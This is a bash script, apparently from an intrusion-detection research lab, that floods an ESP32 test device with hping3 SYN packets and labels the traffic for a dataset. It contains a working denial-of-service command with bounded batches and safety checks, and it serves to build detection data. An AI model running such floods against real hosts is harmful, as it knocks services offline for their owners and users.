#!/usr/bin/env bash
# SYN flood + labeling (Kali managed Wi-Fi on the same hotspot).
# Usage: sudo -E ./host/attacks/syn_flood.sh
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=netconfig.sh
source "${DIR}/netconfig.sh"

# Automated runs require acknowledged raw labels and a bounded lifetime.
label() {
  if [[ "${NIDS_REQUIRE_LABEL_ACK:-0}" == 1 ]]; then
    send_label_confirmed "$1" SYN_FLOOD
  else
    send_label "$1" SYN_FLOOD
  fi
}
LABEL_ACTIVE=0
ATTACK_PID=""
cleanup() {
  local rc=$?
  trap - EXIT
  if [[ -n "$ATTACK_PID" ]]; then
    kill -TERM "$ATTACK_PID" 2>/dev/null || true
    wait "$ATTACK_PID" 2>/dev/null || true
  fi
  if [[ "$LABEL_ACTIVE" == 1 ]]; then
    label STOP || rc=1
  fi
  exit "$rc"
}
trap cleanup EXIT
trap 'exit 130' INT
trap 'exit 143' TERM HUP

TARGET_IP="$(get_esp32_ip)"
TARGET_PORT="${NIDS_TARGET_PORT:-80}"

if ip link show "${MON_IFACE}" >/dev/null 2>&1; then
  echo ">>> WARN: ${MON_IFACE} still up. SYN needs managed Wi-Fi."
  echo ">>> Run: sudo -E ./host/attacks/prepare_wifi.sh managed"
  echo ">>> then join SSID '${SSID}' before re-running."
  exit 1
fi

echo ">>> Target ESP32 IP : ${TARGET_IP}:${TARGET_PORT}"
echo ">>> Out interface   : $WIFI_IFACE"
echo ">>> Label host      : $(get_label_host):${LABEL_PORT}"
ensure_label_path || exit 1
ensure_wifi_associated "$WIFI_IFACE" "$SSID" || exit 1
# Catch "ping works but via NAT/Windows" (ttl~128) after failed hotspot join
if ! ping -c 1 -W 2 "$TARGET_IP" >/dev/null 2>&1; then
  echo ">>> ERROR: cannot ping ${TARGET_IP} on ${WIFI_IFACE} — rejoin '${SSID}'" >&2
  exit 1
fi
echo ">>> READY FOR SYN FLOOD"

command -v hping3 >/dev/null
command -v timeout >/dev/null
# The target must actually route through the selected experiment interface.
ip -4 route get "$TARGET_IP" | grep -Eq "dev ${WIFI_IFACE}([[:space:]]|$)" || {
  echo "Target route does not use experiment interface" >&2; exit 1;
}
LABEL_ACTIVE=1
label START
sleep 1

batch_count=5000
repeats=10
for ((i=1; i<=repeats; i++)); do
  echo ">>> Batch ${i}/${repeats}: flooding ${batch_count} SYN packets"
  timeout --signal=TERM --kill-after=2 10 hping3 -S -p "$TARGET_PORT" -c "$batch_count" --flood \
    -I "$WIFI_IFACE" "$TARGET_IP" &
  ATTACK_PID=$!
  rc=0
  wait "$ATTACK_PID" || rc=$?
  ATTACK_PID=""
  if [[ "$rc" != 0 && "$rc" != 124 ]]; then
    echo "Traffic generator failed: $rc" >&2; exit "$rc";
  fi
  sleep 2
done

sleep 1
label STOP
LABEL_ACTIVE=0
echo " >>> ATTACK FINISHED"
